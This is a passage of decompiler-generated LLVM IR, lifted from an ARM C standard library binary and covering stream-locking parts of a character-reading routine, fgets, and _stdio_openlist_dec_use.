dec_label_pc_169b8:                               ; preds = %dec_label_pc_16964, %bb18
  %v1_169c8 = phi i32 [ %v0_16968, %dec_label_pc_16964 ], [ %v0_169b8.pre, %bb18 ]
  %v1_169b8 = add i32 %v1_169c8, 60
  %v2_169b8 = inttoptr i32 %v1_169b8 to i32*
  %v3_169b8 = load i32, i32* %v2_169b8, align 4
  store i32 %v3_169b8, i32* %r2.global-to-local, align 4
  %v1_169bc = add i32 %v1_169c8, 16
  %v2_169bc = inttoptr i32 %v1_169bc to i32*
  %v3_169bc = load i32, i32* %v2_169bc, align 4
  store i32 %v3_169bc, i32* @r1, align 4
  %v1_169c0 = add i32 %v1_169c8, 24
  %v2_169c0 = inttoptr i32 %v1_169c0 to i32*
  %v3_169c0 = load i32, i32* %v2_169c0, align 4
  store i32 %v3_169c0, i32* %r3.global-to-local, align 4
  %v1_169c4 = add i32 %v3_169b8, 1
  store i32 %v1_169c4, i32* %r2.global-to-local, align 4
  store i32 %v1_169c4, i32* %v2_169b8, align 4
  %v0_169cc = load i32, i32* @r1, align 4
  %v1_169cc = load i32, i32* %r3.global-to-local, align 4
  %v3_169cc = icmp uge i32 %v0_169cc, %v1_169cc
  store i1 %v3_169cc, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_169cc, label %dec_label_pc_169dc, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_169b8
  %v2_169d0 = inttoptr i32 %v0_169cc to i8*
  %v3_169d0 = load i8, i8* %v2_169d0, align 1
  %v4_169d0 = zext i8 %v3_169d0 to i32
  store i32 %v4_169d0, i32* %r5.global-to-local, align 4
  %v6_169d0 = add i32 %v0_169cc, 1
  store i32 %v6_169d0, i32* @r1, align 4
  %v2_169d4 = load i32, i32* @r7, align 4
  %v3_169d4 = add i32 %v2_169d4, 16
  %v4_169d4 = inttoptr i32 %v3_169d4 to i32*
  store i32 %v6_169d0, i32* %v4_169d4, align 4
  br label %dec_label_pc_169e8

dec_label_pc_169dc:                               ; preds = %dec_label_pc_169b8
  %v0_169dc = load i32, i32* @r7, align 4
  %v1_169e0 = inttoptr i32 %v0_169dc to i16*
  %v2_169e0 = call i32 @getc_unlocked(i16* %v1_169e0)
  store i32 %v2_169e0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_169e8

dec_label_pc_169e8:                               ; preds = %.thread2, %dec_label_pc_169dc
  %v0_169e8 = load i32, i32* @r7, align 4
  %v1_169e8 = add i32 %v0_169e8, 60
  %v2_169e8 = inttoptr i32 %v1_169e8 to i32*
  %v3_169e8 = load i32, i32* %v2_169e8, align 4
  %v1_169ec = add i32 %v3_169e8, -1
  store i32 %v1_169ec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_169f0 = icmp eq i32 %v1_169ec, 0
  store i32 %v1_169ec, i32* %v2_169e8, align 4
  br i1 %v2_169f0, label %dec_label_pc_169fc, label %dec_label_pc_16a5c

dec_label_pc_169fc:                               ; preds = %dec_label_pc_169e8
  %v0_169fc = load i32, i32* %r3.global-to-local, align 4
  %v1_169fc = load i32, i32* @r7, align 4
  %v2_169fc = add i32 %v1_169fc, 64
  %v3_169fc = inttoptr i32 %v2_169fc to i32*
  store i32 %v0_169fc, i32* %v3_169fc, align 4
  %v0_16a00 = load i32, i32* @r7, align 4
  %v1_16a00 = add i32 %v0_16a00, 56
  store i32 %v1_16a00, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16a04

dec_label_pc_16a04:                               ; preds = %dec_label_pc_16a34.dec_label_pc_16a04_crit_edge, %dec_label_pc_169fc
  %v0_16a0c = phi i32 [ %v0_16a0c.pre, %dec_label_pc_16a34.dec_label_pc_16a04_crit_edge ], [ %v1_16a00, %dec_label_pc_169fc ]
  %v0_16a04 = phi i32 [ %v0_16a04.pre, %dec_label_pc_16a34.dec_label_pc_16a04_crit_edge ], [ %v0_16a00, %dec_label_pc_169fc ]
  %v1_16a04 = add i32 %v0_16a04, 56
  %v2_16a04 = inttoptr i32 %v1_16a04 to i32*
  %v3_16a04 = load i32, i32* %v2_16a04, align 4
  store i32 %v3_16a04, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_16a0c, i32* %r2.global-to-local, align 4
  %v1_16a1022 = inttoptr i32 %v0_16a0c to i32*
  %v2_16a1023 = load i32, i32* %v1_16a1022, align 4
  store i32 %v2_16a1023, i32* %r3.global-to-local, align 4
  %v3_16a1425 = icmp uge i32 %v2_16a1023, %v3_16a04
  store i1 %v3_16a1425, i1* %cpsr_c.global-to-local, align 1
  %v9_16a1431 = icmp eq i32 %v2_16a1023, %v3_16a04
  br i1 %v9_16a1431, label %dec_label_pc_16a1c, label %dec_label_pc_16a34

dec_label_pc_16a1c:                               ; preds = %dec_label_pc_16a04, %dec_label_pc_16a1c.dec_label_pc_16a10_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16a2c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16a2c, label %dec_label_pc_16a30, label %dec_label_pc_16a1c.dec_label_pc_16a10_crit_edge

dec_label_pc_16a1c.dec_label_pc_16a10_crit_edge:  ; preds = %dec_label_pc_16a1c
  %v0_16a10.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16a14.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16a10 = inttoptr i32 %v0_16a10.pre to i32*
  %v2_16a10 = load i32, i32* %v1_16a10, align 4
  store i32 %v2_16a10, i32* %r3.global-to-local, align 4
  %v3_16a14 = icmp uge i32 %v2_16a10, %v1_16a14.pre
  store i1 %v3_16a14, i1* %cpsr_c.global-to-local, align 1
  %v9_16a14 = icmp eq i32 %v2_16a10, %v1_16a14.pre
  br i1 %v9_16a14, label %dec_label_pc_16a1c, label %dec_label_pc_16a34

dec_label_pc_16a30:                               ; preds = %dec_label_pc_16a1c
  %v0_16a30 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16a30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a34

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16a04, %dec_label_pc_16a1c.dec_label_pc_16a10_crit_edge, %dec_label_pc_16a30
  %v0_16a3c = phi i32 [ %v0_16a30, %dec_label_pc_16a30 ], [ %v2_16a1023, %dec_label_pc_16a04 ], [ %v2_16a10, %dec_label_pc_16a1c.dec_label_pc_16a10_crit_edge ]
  %v1_16a34 = phi i32 [ %v0_16a30, %dec_label_pc_16a30 ], [ %v3_16a04, %dec_label_pc_16a04 ], [ %v1_16a14.pre, %dec_label_pc_16a1c.dec_label_pc_16a10_crit_edge ]
  %v3_16a34 = icmp uge i32 %v0_16a3c, %v1_16a34
  store i1 %v3_16a34, i1* %cpsr_c.global-to-local, align 1
  %v9_16a34 = icmp eq i32 %v0_16a3c, %v1_16a34
  br i1 %v9_16a34, label %dec_label_pc_16a3c, label %dec_label_pc_16a34.dec_label_pc_16a04_crit_edge

dec_label_pc_16a34.dec_label_pc_16a04_crit_edge:  ; preds = %dec_label_pc_16a34
  %v0_16a04.pre = load i32, i32* @r7, align 4
  %v0_16a0c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16a04

dec_label_pc_16a3c:                               ; preds = %dec_label_pc_16a34
  %v2_16a3c = icmp ne i32 %v1_16a34, 0
  store i1 %v2_16a3c, i1* %cpsr_c.global-to-local, align 1
  %v7_16a40 = icmp slt i32 %v1_16a34, 2
  br i1 %v7_16a40, label %dec_label_pc_16a5c, label %dec_label_pc_16a44

dec_label_pc_16a44:                               ; preds = %dec_label_pc_16a3c
  %v0_16a48 = load i32, i32* @r1, align 4
  %v1_16a48 = add i32 %v0_16a48, 129
  store i32 %v1_16a48, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a5c

dec_label_pc_16a5c:                               ; preds = %.thread, %dec_label_pc_169e8, %dec_label_pc_16a44, %dec_label_pc_16a3c, %dec_label_pc_16958
  %v0_16a5c = load i32, i32* %r5.global-to-local, align 4
  %v2_16a64 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16a64, i32* @r4, align 4
  store i32 %v6_16928, i32* @r5, align 4
  store i32 %v9_16928, i32* @r6, align 4
  store i32 %v12_16928, i32* @r7, align 4
  store i32 %v15_16928, i32* @lr, align 4
  ret i32 %v0_16a5c

; uselistorder directives
  uselistorder i32 %v0_16a30, { 1, 0, 2 }
  uselistorder i32 %v1_16a14.pre, { 0, 2, 1 }
  uselistorder i32 %v0_169cc, { 1, 0, 2 }
  uselistorder i32 %v1_169c8, { 0, 2, 1 }
  uselistorder i32 %v1_16988, { 1, 0 }
  uselistorder i32 %v3_16940, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_16a5c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_16a34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a1c, { 1, 0 }
  uselistorder label %dec_label_pc_169e8, { 1, 0 }
  uselistorder label %dec_label_pc_169b8, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_169a8, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16a6c = load i32, i32* @r4, align 4
  store i32 %v3_16a6c, i32* %stack_var_-32, align 4
  %v6_16a6c = load i32, i32* @r5, align 4
  %v9_16a6c = load i32, i32* @r6, align 4
  %v12_16a6c = load i32, i32* @r7, align 4
  %v15_16a6c = load i32, i32* @r8, align 4
  %v24_16a6c = load i32, i32* @lr, align 4
  %v1_16a70 = add i32 %arg3, 52
  %v2_16a70 = inttoptr i32 %v1_16a70 to i32*
  %v3_16a70 = load i32, i32* %v2_16a70, align 4
  store i32 %v3_16a70, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a74 = icmp eq i32 %v3_16a70, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_16a74, label %dec_label_pc_16a88, label %dec_label_pc_16aec

dec_label_pc_16a88:                               ; preds = %entry
  %v0_16a88 = call i32 @__aeabi_read_tp()
  %v1_16a8c = add i32 %arg3, 64
  %v2_16a8c = inttoptr i32 %v1_16a8c to i32*
  %v3_16a8c = load i32, i32* %v2_16a8c, align 4
  store i32 %v3_16a8c, i32* %r3.global-to-local, align 4
  %v1_16a90 = add i32 %v0_16a88, -1168
  store i32 %v1_16a90, i32* @r8, align 4
  %v3_16a94 = icmp uge i32 %v3_16a8c, %v1_16a90
  store i1 %v3_16a94, i1* %cpsr_c.global-to-local, align 1
  %v9_16a94 = icmp eq i32 %v3_16a8c, %v1_16a90
  br i1 %v9_16a94, label %dec_label_pc_16ae0, label %dec_label_pc_16a9c

dec_label_pc_16a9c:                               ; preds = %dec_label_pc_16a88
  %v1_16a9c = add i32 %arg3, 56
  store i32 %v1_16a9c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_16a9c, i32* %r2.global-to-local, align 4
  %v0_16aa8 = load i32, i32* @r6, align 4
  store i32 %v0_16aa8, i32* @r4, align 4
  %v1_16aac36 = inttoptr i32 %v1_16a9c to i32*
  %v2_16aac37 = load i32, i32* %v1_16aac36, align 4
  store i32 %v2_16aac37, i32* %r3.global-to-local, align 4
  %v3_16ab039 = icmp uge i32 %v2_16aac37, %v0_16aa8
  store i1 %v3_16ab039, i1* %cpsr_c.global-to-local, align 1
  %v9_16ab045 = icmp eq i32 %v2_16aac37, %v0_16aa8
  br i1 %v9_16ab045, label %dec_label_pc_16ab8, label %dec_label_pc_16ad0

dec_label_pc_16ab8:                               ; preds = %dec_label_pc_16a9c, %dec_label_pc_16ab8.dec_label_pc_16aac_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ac8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ac8, label %dec_label_pc_16acc, label %dec_label_pc_16ab8.dec_label_pc_16aac_crit_edge

dec_label_pc_16ab8.dec_label_pc_16aac_crit_edge:  ; preds = %dec_label_pc_16ab8
  %v0_16aac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16ab0.pre = load i32, i32* @r4, align 4
  %v1_16aac = inttoptr i32 %v0_16aac.pre to i32*
  %v2_16aac = load i32, i32* %v1_16aac, align 4
  store i32 %v2_16aac, i32* %r3.global-to-local, align 4
  %v3_16ab0 = icmp uge i32 %v2_16aac, %v1_16ab0.pre
  store i1 %v3_16ab0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ab0 = icmp eq i32 %v2_16aac, %v1_16ab0.pre
  br i1 %v9_16ab0, label %dec_label_pc_16ab8, label %dec_label_pc_16ad0

dec_label_pc_16acc:                               ; preds = %dec_label_pc_16ab8
  %v0_16acc = load i32, i32* @r4, align 4
  store i32 %v0_16acc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ad0

dec_label_pc_16ad0:                               ; preds = %dec_label_pc_16a9c, %dec_label_pc_16ab8.dec_label_pc_16aac_crit_edge, %dec_label_pc_16acc
  %v0_16ad0 = phi i32 [ %v0_16acc, %dec_label_pc_16acc ], [ %v2_16aac37, %dec_label_pc_16a9c ], [ %v2_16aac, %dec_label_pc_16ab8.dec_label_pc_16aac_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ad0 = icmp eq i32 %v0_16ad0, 0
  br i1 %v2_16ad0, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_16ad0
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_16ad0, %bb
  store i32 92892, i32* @lr, align 4
  %v1_16ad8 = xor i1 %v2_16ad0, true
  call void @__pseudo_cond_branch(i1 %v1_16ad8, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_16adc = load i32, i32* @r8, align 4
  %v1_16adc = load i32, i32* @r7, align 4
  %v2_16adc = add i32 %v1_16adc, 64
  %v3_16adc = inttoptr i32 %v2_16adc to i32*
  store i32 %v0_16adc, i32* %v3_16adc, align 4
  br label %dec_label_pc_16ae0

dec_label_pc_16ae0:                               ; preds = %dec_label_pc_16a88, %bb20
  %v0_16ae0 = load i32, i32* @r7, align 4
  %v1_16ae0 = add i32 %v0_16ae0, 60
  %v2_16ae0 = inttoptr i32 %v1_16ae0 to i32*
  %v3_16ae0 = load i32, i32* %v2_16ae0, align 4
  %v1_16ae4 = add i32 %v3_16ae0, 1
  store i32 %v1_16ae4, i32* %r3.global-to-local, align 4
  store i32 %v1_16ae4, i32* %v2_16ae0, align 4
  %v0_16aec.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_16af0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_16af4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16aec

dec_label_pc_16aec:                               ; preds = %entry, %dec_label_pc_16ae0
  %v0_16af4 = phi i32 [ %arg3, %entry ], [ %v0_16af4.pre, %dec_label_pc_16ae0 ]
  %v0_16af0 = phi i32 [ %arg2, %entry ], [ %v0_16af0.pre, %dec_label_pc_16ae0 ]
  %v0_16aec = phi i32 [ %arg1, %entry ], [ %v0_16aec.pre, %dec_label_pc_16ae0 ]
  store i32 %v0_16af0, i32* %r1.global-to-local, align 4
  store i32 %v0_16af4, i32* %r2.global-to-local, align 4
  %v3_16af8 = inttoptr i32 %v0_16aec to i8*
  %v4_16af8 = call i32 @__GI_fgets_unlocked(i8* %v3_16af8, i32 %v0_16af0, i32 %v0_16af4)
  %v0_16afc = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16afc = icmp eq i32 %v0_16afc, 0
  store i32 %v4_16af8, i32* %r8.global-to-local, align 4
  br i1 %v2_16afc, label %dec_label_pc_16b08, label %dec_label_pc_16b7c

dec_label_pc_16b08:                               ; preds = %dec_label_pc_16aec
  %v0_16b08 = load i32, i32* @r7, align 4
  %v1_16b08 = add i32 %v0_16b08, 60
  %v2_16b08 = inttoptr i32 %v1_16b08 to i32*
  %v3_16b08 = load i32, i32* %v2_16b08, align 4
  %v1_16b0c = add i32 %v3_16b08, -1
  store i32 %v1_16b0c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16b10 = icmp eq i32 %v1_16b0c, 0
  store i32 %v1_16b0c, i32* %v2_16b08, align 4
  br i1 %v2_16b10, label %dec_label_pc_16b1c, label %dec_label_pc_16b7c

dec_label_pc_16b1c:                               ; preds = %dec_label_pc_16b08
  %v0_16b1c = load i32, i32* %r3.global-to-local, align 4
  %v1_16b1c = load i32, i32* @r7, align 4
  %v2_16b1c = add i32 %v1_16b1c, 64
  %v3_16b1c = inttoptr i32 %v2_16b1c to i32*
  store i32 %v0_16b1c, i32* %v3_16b1c, align 4
  %v0_16b20 = load i32, i32* @r7, align 4
  %v1_16b20 = add i32 %v0_16b20, 56
  store i32 %v1_16b20, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16b24

dec_label_pc_16b24:                               ; preds = %dec_label_pc_16b54.dec_label_pc_16b24_crit_edge, %dec_label_pc_16b1c
  %v0_16b2c = phi i32 [ %v0_16b2c.pre, %dec_label_pc_16b54.dec_label_pc_16b24_crit_edge ], [ %v1_16b20, %dec_label_pc_16b1c ]
  %v0_16b24 = phi i32 [ %v0_16b24.pre, %dec_label_pc_16b54.dec_label_pc_16b24_crit_edge ], [ %v0_16b20, %dec_label_pc_16b1c ]
  %v1_16b24 = add i32 %v0_16b24, 56
  %v2_16b24 = inttoptr i32 %v1_16b24 to i32*
  %v3_16b24 = load i32, i32* %v2_16b24, align 4
  store i32 %v3_16b24, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16b2c, i32* %r2.global-to-local, align 4
  %v1_16b3024 = inttoptr i32 %v0_16b2c to i32*
  %v2_16b3025 = load i32, i32* %v1_16b3024, align 4
  store i32 %v2_16b3025, i32* %r3.global-to-local, align 4
  %v3_16b3427 = icmp uge i32 %v2_16b3025, %v3_16b24
  store i1 %v3_16b3427, i1* %cpsr_c.global-to-local, align 1
  %v9_16b3433 = icmp eq i32 %v2_16b3025, %v3_16b24
  br i1 %v9_16b3433, label %dec_label_pc_16b3c, label %dec_label_pc_16b54

dec_label_pc_16b3c:                               ; preds = %dec_label_pc_16b24, %dec_label_pc_16b3c.dec_label_pc_16b30_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16b4c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16b4c, label %dec_label_pc_16b50, label %dec_label_pc_16b3c.dec_label_pc_16b30_crit_edge

dec_label_pc_16b3c.dec_label_pc_16b30_crit_edge:  ; preds = %dec_label_pc_16b3c
  %v0_16b30.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16b34.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16b30 = inttoptr i32 %v0_16b30.pre to i32*
  %v2_16b30 = load i32, i32* %v1_16b30, align 4
  store i32 %v2_16b30, i32* %r3.global-to-local, align 4
  %v3_16b34 = icmp uge i32 %v2_16b30, %v1_16b34.pre
  store i1 %v3_16b34, i1* %cpsr_c.global-to-local, align 1
  %v9_16b34 = icmp eq i32 %v2_16b30, %v1_16b34.pre
  br i1 %v9_16b34, label %dec_label_pc_16b3c, label %dec_label_pc_16b54

dec_label_pc_16b50:                               ; preds = %dec_label_pc_16b3c
  %v0_16b50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16b50, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b54

dec_label_pc_16b54:                               ; preds = %dec_label_pc_16b24, %dec_label_pc_16b3c.dec_label_pc_16b30_crit_edge, %dec_label_pc_16b50
  %v0_16b5c = phi i32 [ %v0_16b50, %dec_label_pc_16b50 ], [ %v2_16b3025, %dec_label_pc_16b24 ], [ %v2_16b30, %dec_label_pc_16b3c.dec_label_pc_16b30_crit_edge ]
  %v1_16b54 = phi i32 [ %v0_16b50, %dec_label_pc_16b50 ], [ %v3_16b24, %dec_label_pc_16b24 ], [ %v1_16b34.pre, %dec_label_pc_16b3c.dec_label_pc_16b30_crit_edge ]
  %v3_16b54 = icmp uge i32 %v0_16b5c, %v1_16b54
  store i1 %v3_16b54, i1* %cpsr_c.global-to-local, align 1
  %v9_16b54 = icmp eq i32 %v0_16b5c, %v1_16b54
  br i1 %v9_16b54, label %dec_label_pc_16b5c, label %dec_label_pc_16b54.dec_label_pc_16b24_crit_edge

dec_label_pc_16b54.dec_label_pc_16b24_crit_edge:  ; preds = %dec_label_pc_16b54
  %v0_16b24.pre = load i32, i32* @r7, align 4
  %v0_16b2c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16b24

dec_label_pc_16b5c:                               ; preds = %dec_label_pc_16b54
  %v2_16b5c = icmp ne i32 %v1_16b54, 0
  store i1 %v2_16b5c, i1* %cpsr_c.global-to-local, align 1
  %v7_16b60 = icmp slt i32 %v1_16b54, 2
  br i1 %v7_16b60, label %dec_label_pc_16b7c, label %dec_label_pc_16b64

dec_label_pc_16b64:                               ; preds = %dec_label_pc_16b5c
  %v0_16b68 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b68 = add i32 %v0_16b68, 129
  store i32 %v1_16b68, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b7c

dec_label_pc_16b7c:                               ; preds = %dec_label_pc_16b08, %dec_label_pc_16aec, %dec_label_pc_16b64, %dec_label_pc_16b5c
  %v0_16b7c = load i32, i32* %r8.global-to-local, align 4
  %v2_16b80 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16b80, i32* %r4.global-to-local, align 4
  store i32 %v6_16a6c, i32* @r5, align 4
  store i32 %v9_16a6c, i32* @r6, align 4
  store i32 %v12_16a6c, i32* @r7, align 4
  store i32 %v15_16a6c, i32* @r8, align 4
  store i32 %v24_16a6c, i32* @lr, align 4
  ret i32 %v0_16b7c

; uselistorder directives
  uselistorder i32 %v0_16b50, { 1, 0, 2 }
  uselistorder i32 %v1_16b34.pre, { 0, 2, 1 }
  uselistorder i32 %v0_16af0, { 1, 0 }
  uselistorder i32 %v0_16af4, { 1, 0 }
  uselistorder i32 %v1_16ab0.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 12, 4, 5, 6, 7, 9, 8, 11, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 9, 10, 7, 8 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_16b7c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16b54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b3c, { 1, 0 }
  uselistorder label %dec_label_pc_16aec, { 1, 0 }
  uselistorder label %dec_label_pc_16ae0, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_16ad0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ab8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16b88 = load i32, i32* @r4, align 4
  store i32 %v3_16b88, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r5.global-to-local, align 4
  %v4_16b98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 160) to i32*), align 4
  store i32 %v4_16b98, i32* %r7.global-to-local, align 4
  %v0_16b9c = call i32 @__aeabi_read_tp()
  store i32 %v0_16b9c, i32* %r0.global-to-local, align 4
  %v1_16ba0 = add i32 %v4_16b98, 8
  %v2_16ba0 = inttoptr i32 %v1_16ba0 to i32*
  %v3_16ba0 = load i32, i32* %v2_16ba0, align 4
  store i32 %v3_16ba0, i32* %r3.global-to-local, align 4
  %v1_16ba4 = add i32 %v0_16b9c, -1168
  store i32 %v1_16ba4, i32* %r6.global-to-local, align 4
  %v3_16ba8 = icmp uge i32 %v3_16ba0, %v1_16ba4
  store i1 %v3_16ba8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ba8 = icmp eq i32 %v3_16ba0, %v1_16ba4
  br i1 %v9_16ba8, label %dec_label_pc_16bf4, label %dec_label_pc_16bb4

dec_label_pc_16bb4:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16b98, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_16bc093 = inttoptr i32 %v4_16b98 to i32*
  %v2_16bc094 = load i32, i32* %v1_16bc093, align 4
  store i32 %v2_16bc094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16bc496 = icmp eq i32 %v2_16bc094, 0
  br i1 %v9_16bc496, label %dec_label_pc_16bcc, label %dec_label_pc_16be4

dec_label_pc_16bcc:                               ; preds = %dec_label_pc_16bb4, %dec_label_pc_16bcc.dec_label_pc_16bc0_crit_edge
  %v0_16bcc97 = phi i32 [ %v1_16bc4.pre, %dec_label_pc_16bcc.dec_label_pc_16bc0_crit_edge ], [ 0, %dec_label_pc_16bb4 ]
  store i32 %v0_16bcc97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16bdc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16bdc, label %dec_label_pc_16be0, label %dec_label_pc_16bcc.dec_label_pc_16bc0_crit_edge

dec_label_pc_16bcc.dec_label_pc_16bc0_crit_edge:  ; preds = %dec_label_pc_16bcc
  %v0_16bc0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16bc4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16bc0 = inttoptr i32 %v0_16bc0.pre to i32*
  %v2_16bc0 = load i32, i32* %v1_16bc0, align 4
  store i32 %v2_16bc0, i32* %r3.global-to-local, align 4
  %v3_16bc4 = icmp uge i32 %v2_16bc0, %v1_16bc4.pre
  store i1 %v3_16bc4, i1* %cpsr_c.global-to-local, align 1
  %v9_16bc4 = icmp eq i32 %v2_16bc0, %v1_16bc4.pre
  br i1 %v9_16bc4, label %dec_label_pc_16bcc, label %dec_label_pc_16be4

dec_label_pc_16be0:                               ; preds = %dec_label_pc_16bcc
  %v0_16be0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16be0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16be4

dec_label_pc_16be4:                               ; preds = %dec_label_pc_16bb4, %dec_label_pc_16bcc.dec_label_pc_16bc0_crit_edge, %dec_label_pc_16be0
  %v0_16be4 = phi i32 [ %v0_16be0, %dec_label_pc_16be0 ], [ %v2_16bc094, %dec_label_pc_16bb4 ], [ %v2_16bc0, %dec_label_pc_16bcc.dec_label_pc_16bc0_crit_edge ]
  %v1_16be4 = phi i32 [ %v0_16be0, %dec_label_pc_16be0 ], [ 0, %dec_label_pc_16bb4 ], [ %v1_16bc4.pre, %dec_label_pc_16bcc.dec_label_pc_16bc0_crit_edge ]
  %v3_16be4 = icmp uge i32 %v0_16be4, %v1_16be4
  store i1 %v3_16be4, i1* %cpsr_c.global-to-local, align 1
  %v9_16be4 = icmp eq i32 %v0_16be4, %v1_16be4
  br i1 %v9_16be4, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_16be4
  %v1_16be8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16be8, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_16be4, %bb
  %v1_16bec = xor i1 %v9_16be4, true
  call void @__pseudo_cond_branch(i1 %v1_16bec, i32 ptrtoint (i32* @global_var_14794.527 to i32))
